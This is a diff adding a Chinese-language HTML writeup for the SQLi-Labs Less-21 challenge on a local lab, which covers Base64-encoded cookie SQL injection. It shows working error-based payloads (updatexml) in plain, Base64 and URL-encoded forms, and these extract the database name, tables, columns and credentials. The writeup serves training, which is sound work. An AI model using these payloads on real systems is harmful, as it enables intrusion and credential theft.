@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-21 Base64 编码 Cookie 注入 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-21 Base64 编码 Cookie 注入 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.25 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, Cookie注入, Base64编码, 报错注入</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-21 (Cookie Injection - Error Based - complex - string)</li>
+        <li><strong>提示：</strong>Cookie 注入，Base64 编码，报错注入</li>
+    </ul>
+
+    <h2>2. 解题思路与前置原理</h2>
+    <p>本关卡依旧是 Cookie 维持登录状态，但与 L20 不同的是，后台使用 <code>base64_decode()</code> 和 <code>base64_encode()</code> 对 Cookie 的值进行了编码和解码处理。</p>
+    <p>因此，当我们要在 Cookie 中注入恶意 Payload 时，必须先将 Payload 进行 <b>Base64 编码</b>，再发送给服务器。同时，由于 HTTP 传输中 <code>+</code>、<code>=</code> 等符号可能引起解析问题，通常需要对 Base64 编码后的结果进行 <b>URL 编码</b>（如将 <code>=</code> 转为 <code>%3D</code>）。</p>
+    <p>通过测试得知，后台的闭合方式为单引号加括号 <code>')</code>。由于行尾注释符容易被吞，最终采用 <code>') or updatexml(...) #</code> 的语法构造。</p>
+
+    <h2>3. 操作步骤与解析</h2>
+    
+    <p><strong>第一步：抓包与识别编码</strong></p>
+    <p>使用 admin 登录后，刷新页面并在 Burp 中抓取 GET 请求。观察请求头：<br>
+    <code>Cookie: uname=YWRtaW4%3D</code><br>
+    <code>YWRtaW4=</code> 是 <code>admin</code> 的 Base64 编码，<code>%3D</code> 是 <code>=</code> 的 URL 编码。确认服务器期待接收 Base64 编码的数据。</p>
+
+    <p><strong>第二步：构造 Payload 并进行编码</strong></p>
+    <p>使用 Burp Suite 顶部的 <b>解码器 (Decoder)</b> 标签，将明文 Payload 转换为符合要求的密文。以获取库名为例：</p>
+    <ol>
+        <li><strong>明文 Payload：</strong> <code>admin') or updatexml(1,concat(0x7e,(select database()),0x7e),1)#</code></li>
+        <li><strong>Base64 编码后：</strong> <code>YWRtaW4nKSBvciB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIw==</code></li>
+        <li><strong>URL 编码后（可选，替换等号）：</strong> <code>YWRtaW4nKSBvciB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIw%3D%3D</code></li>
+    </ol>
+
+    <p><strong>第三步：发送注入请求</strong></p>
+    <p>在 Repeater 中，将 Cookie 替换为编码后的 Payload：</p>
+    <pre><code>Cookie: uname=YWRtaW4nKSBvciB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIw%3D%3D</code></pre>
+    <p><strong>回显现象：</strong>页面报错，黄字显示 <code>XPATH syntax error: '~security~'</code>。注入成功。</p>
+
+    <p><strong>第四步：依次获取表名、列名与账号密码</strong></p>
+    <p>将以下 Payload 同样使用 Decoder 进行 Base64 和 URL 编码，替换 Cookie 发送：</p>
+    <ul>
+        <li><strong>表名：</strong><code>admin') or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1)#</code></li>
+        <li><strong>列名：</strong><code>admin') or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1)#</code> (注：此处未限制库名，导致查出系统表列名，属于数据污染)</li>
+        <li><strong>账号密码：</strong><code>admin') or updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1)#</code></li>
+    </ul>
+    <p><strong>回显现象：</strong>最终成功爆出 <code>~Dumb:Dumb~</code>。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>编码链的复杂性：</strong>在实战中，Cookie 被 Base64 包装很常见。我们需要在 <b>Payload 构造</b> -> <b>Base64 编码</b> -> <b>URL 编码</b> 三者之间熟练切换。</li>
+        <li><strong>注释符失效的妥协：</strong>由于 HTTP 传输对特殊字符的限制，在复杂的编码环境中，`#` 和 `--+` 常常失效。通过 `and '1'='1` 或者 `or 1=1 #` 等方式进行逻辑闭合，是应对此类环境的有效手段。</li>
+        <li><strong>数据污染：</strong>在查询 `information_schema.columns` 时，只加 `table_name` 限制会把系统自带表的列名也捞出来。标准姿势是加上 `and table_schema='security'`，精准过滤。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>Base64 编码注入：</strong>当遇到服务端对数据进行编码解码时，需要将 Payload 编码为服务器可识别的格式。</li>
+        <li><strong>Burp 解码器：</strong>熟练使用 Burp 的 Decoder 模块进行 Base64、URL 等多重编码的来回转换，是进行复杂注入的基础技能。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
